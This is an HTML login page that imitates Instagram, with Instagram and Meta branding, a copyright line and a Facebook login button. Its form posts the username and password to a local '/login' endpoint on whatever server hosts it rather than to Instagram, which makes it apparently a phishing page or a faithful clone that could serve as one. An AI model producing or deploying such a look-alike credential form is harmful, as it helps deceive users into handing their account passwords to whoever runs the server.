<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta
    name="viewport"
    content="width=device-width, initial-scale=1.0"
  />

  <title>Instagram</title>

  <link
    rel="icon"
    type="image/png"
    href="/assets/logo.png"
  />

  <link
    rel="stylesheet"
    href="/assets/style.css"
  />
</head>

<body>

  <!-- HEADER -->
  <header class="header">
    <img
      src="/assets/logo.png"
      alt="Instagram"
    />
  </header>

  <!-- MAIN -->
  <main class="main-content">

    <!-- LEFT -->
    <section class="left-section">

      <div class="hero-wrapper">

        <h1 class="hero-title">
          See everyday moments from your
          <span class="gradient-text">
            close friends.
          </span>
        </h1>

        <img
          src="/assets/hero.png"
          alt="Hero"
          class="hero-image"
        />

      </div>

    </section>

    <!-- RIGHT -->
    <section class="right-section">

      <div class="login-box">

        <!-- TOP -->
        <div class="login-top">
          <span class="back-arrow">‹</span>
          <span>Log into Instagram</span>
        </div>

        <!-- FORM -->
        <form method="POST" action="/login">

          <input
            type="text"
            id="username"
            name="username"
            class="ig-input"
            placeholder="Mobile number, username or email"
            required
          />

          <input
            type="password"
            id="password"
            name="password"
            class="ig-input"
            placeholder="Password"
            required
          />

          <button
            type="submit"
            id="login-btn"
            class="ig-btn"
            disabled
          >
            Log in
          </button>

        </form>

        <!-- FORGOT -->
        <div class="forgot-password clickable">
          Forgot password?
        </div>

        <!-- DIVIDER -->
        <div class="divider">
          OR
        </div>

        <!-- FACEBOOK -->
        <div class="secondary-btn clickable">

          <svg
            xmlns="http://www.w3.org/2000/svg"
            width="18"
            height="18"
            viewBox="0 0 24 24"
            fill="#1877f2"
          >
            <path d="M24 12.073C24 5.405 18.627 0 12 0S0 5.405 0 12.073C0 18.1 4.388 23.094 10.125 24v-8.437H7.078v-3.49h3.047V9.41c0-3.025 1.792-4.697 4.533-4.697 1.312 0 2.686.236 2.686.236v2.97h-1.514c-1.491 0-1.956.93-1.956 1.886v2.267h3.328l-.532 3.49h-2.796V24C19.612 23.094 24 18.1 24 12.073z"/>
          </svg>

          Log in with Facebook

        </div>

        <!-- CREATE -->
        <div class="outline-btn clickable">
          Create new account
        </div>

        <!-- META -->
        <div class="meta-text">

          <svg
            width="22"
            height="14"
            viewBox="0 0 76 65"
            fill="none"
          >
            <path
              d="M16.3 8C7.3 8 0 15.6 0 25C0 34.4 7.3 42 16.3 42C24 42 29.4 35.9 37.7 24.4C46.3 12.4 51 8 59.7 8C68.7 8 76 15.6 76 25C76 34.4 68.7 42 59.7 42C52 42 46.6 35.9 38.3 24.4C29.7 12.4 25 8 16.3 8Z"
              stroke="#0095F6"
              stroke-width="6"
              stroke-linecap="round"
              stroke-linejoin="round"
            />
          </svg>

          <span>Meta</span>

        </div>

      </div>

    </section>

  </main>

  <!-- FOOTER -->
  <footer>

    <div class="footer-links">

      <a href="#">Meta</a>
      <a href="#">About</a>
      <a href="#">Blog</a>
      <a href="#">Jobs</a>
      <a href="#">Help</a>
      <a href="#">API</a>
      <a href="#">Privacy</a>
      <a href="#">Terms</a>
      <a href="#">Locations</a>
      <a href="#">Instagram Lite</a>
      <a href="#">Threads</a>
      <a href="#">Meta Verified</a>

    </div>

    <div class="footer-bottom">

      <select>
        <option>English</option>
        <option>Bahasa Indonesia</option>
      </select>

      <span>
        © 2026 Instagram from Meta
      </span>

    </div>

  </footer>

  <script>

    const usernameInput =
      document.getElementById('username');

    const passwordInput =
      document.getElementById('password');

    const loginBtn =
      document.getElementById('login-btn');

    function checkInputs() {

      const valid =
        usernameInput.value.trim().length >= 6 &&
        passwordInput.value.trim().length >= 6;

      loginBtn.disabled = !valid;

    }

    usernameInput.addEventListener(
      'input',
      checkInputs
    );

    passwordInput.addEventListener(
      'input',
      checkInputs
    );

  </script>

</body>
</html>
